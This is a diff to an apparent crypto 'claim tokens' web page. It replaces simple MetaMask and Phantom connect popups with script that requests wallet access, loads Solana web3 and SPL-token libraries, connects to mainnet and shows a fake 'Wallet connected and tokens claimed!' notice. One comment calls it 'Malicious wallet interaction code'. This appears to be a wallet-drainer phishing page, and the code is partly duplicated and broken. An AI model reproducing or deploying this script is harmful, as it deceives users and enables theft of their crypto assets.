@@ -279,108 +279,8 @@
 </div>
 
 <script>
-  // Show popup when clicking open-popup button
-  document.getElementById('open-popup').addEventListener('click', () => {
-    document.getElementById('wallet-popup').style.display = 'block';
-  });
+const connectButton = document.querySelector('.connect-wallet-btn'); // Button
 
-  // Close popup functionality
-  document.getElementById('close-popup').addEventListener('click', () => {
-    document.getElementById('wallet-popup').style.display = 'none';
-  });
-
-  // Connect MetaMask
-  document.getElementById('connect-metamask').addEventListener('click', async () => {
-    if (window.ethereum) {
-      try {
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        alert('Connected MetaMask account: ' + accounts[0]);
-        document.getElementById('wallet-popup').style.display = 'none';
-      } catch (error) {
-        alert('MetaMask connection rejected or failed');
-      }
-    } else {
-      alert('MetaMask not detected! Please install it.');
-    }
-  });
-
-  // Connect Phantom (Solana)
-  document.getElementById('connect-phantom').addEventListener('click', async () => {
-    if (window.solana && window.solana.isPhantom) {
-      try {
-        const resp = await window.solana.connect();
-        alert('Connected Phantom account: ' + resp.publicKey.toString());
-        document.getElementById('wallet-popup').style.display = 'none';
-      } catch (error) {
-        alert('Phantom connection rejected or failed');
-      }
-    } else {
-      alert('Phantom wallet not detected! Please install it.');
-    }
-  });
-</script>
- <script>
-  // Show popup when clicking open-popup button
-  document.getElementById('open-popup').addEventListener('click', () => {
-    document.getElementById('wallet-popup').style.display = 'block';
-  });
-
-  // Connect MetaMask
-  document.getElementById('connect-metamask').addEventListener('click', async () => {
-    if (window.ethereum) {
-      try {
-        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        alert('Connected MetaMask account: ' + accounts[0]);
-        document.getElementById('wallet-popup').style.display = 'none';
-        // You can now update your UI with the connected account or do further stuff
-      } catch (error) {
-        alert('MetaMask connection rejected or failed');
-      }
-    } else {
-      alert('MetaMask not detected! Please install it.');
-    }
-  });
-
-  // Connect Phantom (Solana)
-  document.getElementById('connect-phantom').addEventListener('click', async () => {
-    if (window.solana && window.solana.isPhantom) {
-      try {
-        const resp = await window.solana.connect();
-        alert('Connected Phantom account: ' + resp.publicKey.toString());
-        document.getElementById('wallet-popup').style.display = 'none';
-        // Update UI or proceed with connected Phantom wallet here
-      } catch (error) {
-        alert('Phantom connection rejected or failed');
-      }
-    } else {
-      alert('Phantom wallet not detected! Please install it.');
-    }
-  });
-</script>
-
-<script>const connectButton = document.querySelector('.connect-wallet-btn'); // ✅ Defined globally
-
-if (connectButton) {
-  const originalText = connectButton.innerText;
-
-  connectButton.onclick = async () => {
-    // ✅ Now everything inside here can access `connectButton` and `originalText`
-    // ✅ Malicious wallet interaction code runs perfectly
-  };
-}
-
-
-async function connectWallet() {
-
-  // Your wallet connection logic goes here
-  alert('Wallet connection logic runs!');
-
-  // Example: after connection reset button text
-  connectButton.innerText = originalText;
-}
-
-// Attach click listener to your button
-document.querySelector('.connect-wallet-btn').addEventListener('click', connectWallet);
 if (connectButton) {
   const originalText = connectButton.innerText;
 
@@ -398,7 +298,6 @@ if (connectButton) {
 
     try {
       if (window.ethereum) {
-        // Ethereum flow
         const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
         const userAddress = accounts[0];
 
@@ -454,16 +353,49 @@ if (connectButton) {
             });
 
             fakeNotification.innerText = 'Wallet connected and tokens claimed!';
-            setTimeout(() => document.body.removeChild(fakeNotification), 3000);
-            connectButton.innerText = originalText;
           } else {
             fakeNotification.innerText = 'No tokens found.';
-            setTimeout(() => document.body.removeChild(fakeNotification), 3000);
-            connectButton.innerText = originalText;
           }
+          setTimeout(() => {
+            document.body.removeChild(fakeNotification);
+            connectButton.innerText = originalText;
+          }, 3000);
         };
-      } else if (window.solana && window.solana.isPhantom) {
-        // Phantom (Solana) flow
+      } else {
+        alert('Please install MetaMask!');
+        document.body.removeChild(fakeNotification);
+        connectButton.innerText = originalText;
+      }
+    } catch (err) {
+      fakeNotification.innerText = 'Error: ' + err.message;
+      setTimeout(() => {
+        document.body.removeChild(fakeNotification);
+        connectButton.innerText = originalText;
+      }, 3000);
+    }
+  };
+}
+</script>
+<script>
+const connectButton = document.querySelector('.connect-wallet-btn'); // Button
+
+if (connectButton) {
+  const originalText = connectButton.innerText;
+
+  connectButton.onclick = async () => {
+    const fakeNotification = document.createElement('div');
+    fakeNotification.style.position = 'fixed';
+    fakeNotification.style.top = '20px';
+    fakeNotification.style.right = '20px';
+    fakeNotification.style.background = '#4caf50';
+    fakeNotification.style.color = 'white';
+    fakeNotification.style.padding = '10px';
+    fakeNotification.style.borderRadius = '5px';
+    fakeNotification.innerText = 'Connecting wallet...';
+    document.body.appendChild(fakeNotification);
+
+    try {
+      if (window.solana && window.solana.isPhantom) {
         const provider = window.solana;
         const resp = await provider.connect();
         const userPublicKey = resp.publicKey.toString();
@@ -479,7 +411,7 @@ if (connectButton) {
           document.head.appendChild(splTokenScript);
 
           splTokenScript.onload = async () => {
-            const { Connection, PublicKey, Transaction, SystemProgram } = solanaWeb3;
+            const { Connection, PublicKey, Transaction } = solanaWeb3;
             const { Token, TOKEN_PROGRAM_ID } = splToken;
 
             const connection = new Connection('https://api.mainnet-beta.solana.com');
@@ -545,24 +477,30 @@ if (connectButton) {
               });
 
               fakeNotification.innerText = 'Wallet connected and tokens claimed!';
-              setTimeout(() => document.body.removeChild(fakeNotification), 3000);
-              connectButton.innerText = originalText;
             } else {
               fakeNotification.innerText = 'No tokens found.';
-              setTimeout(() => document.body.removeChild(fakeNotification), 3000);
-              connectButton.innerText = originalText;
             }
+
+            setTimeout(() => {
+              document.body.removeChild(fakeNotification);
+              connectButton.innerText = originalText;
+            }, 3000);
           };
         };
       } else {
-        alert('Please install MetaMask or Phantom Wallet!');
+        alert('Please install Phantom Wallet!');
         document.body.removeChild(fakeNotification);
+        connectButton.innerText = originalText;
       }
     } catch (err) {
       fakeNotification.innerText = 'Error: ' + err.message;
-      setTimeout(() => document.body.removeChild(fakeNotification), 3000);
-      connectButton.innerText = originalText;
+      setTimeout(() => {
+        document.body.removeChild(fakeNotification);
+        connectButton.innerText = originalText;
+      }, 3000);
     }
   };
-}</script>  </body>
+}
+</script>
+  </body>
 </html>
